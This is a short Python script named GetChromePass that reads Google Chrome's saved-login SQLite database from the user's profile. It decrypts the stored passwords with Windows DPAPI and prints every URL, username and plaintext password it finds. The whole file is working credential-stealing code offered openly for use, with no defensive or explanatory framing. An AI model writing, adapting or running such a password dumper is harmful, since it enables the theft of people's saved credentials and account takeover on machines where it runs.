import os, sqlite3, win32crypt, six
#python -m pip install --upgrade pywin32

class GetChromePass:
    def __init__(self):
        self.data_path = os.path.expanduser('~').replace("\\", '/') + "/AppData/Local/Google/Chrome/User Data/Default"
        self.login_db = os.path.join(self.data_path, 'Login Data')
        self.result = ""

    def start(self):  
        #Retriving Password Hash From Database File
        c = sqlite3.connect(self.login_db)  
        cursor = c.cursor()
        select_statement = "SELECT origin_url, username_value, password_value FROM logins"
        cursor.execute(select_statement)
        login_data = cursor.fetchall()

        credentials_dict = {}  

        #Decrypting password
        for url, user_name, pwd, in login_data:
            pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0) #Tuple
            credentials_dict[url] = (user_name, pwd[1])
        
        #Iterating Each Creds and Storing it in "self.result"
        for url, credentials in six.iteritems(credentials_dict):
            if credentials[1]:
                self.result += "\n\nURL      : " + url
                self.result += "\nUsername : " + credentials[0]
                self.result += "\nPassword : " + credentials[1].decode('utf-8')
                
            else:   
                self.result += "\n\nURL      : " + url
                self.result += "\nUsername : NOT FOUND"
                self.result += "\nPassword : NOT FOUND"

        return self.result
        
if __name__ == '__main__':
    test = GetChromePass()
    result = test.start()
    print(result)
